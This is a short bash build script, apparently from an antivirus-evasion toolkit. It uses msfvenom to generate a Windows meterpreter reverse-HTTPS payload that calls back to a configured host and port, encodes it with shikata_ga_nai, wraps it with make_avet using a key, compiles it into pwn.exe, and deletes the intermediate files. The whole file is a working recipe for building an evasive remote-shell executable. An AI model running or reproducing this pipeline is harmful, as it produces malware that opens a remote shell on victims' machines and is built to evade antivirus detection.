#!/bin/bash        
# example build script

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# configure your connect-back settings here
LHOST=192.168.2.103
LPORT=443

# generate payload and call avet
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > sc.txt
./make_avet -f sc.txt -k "somewhat.somewhere"

# compile
$win32_compiler -o pwn.exe avet.c -lws2_32

# cleanup
rm sc.txt && echo "" > defs.h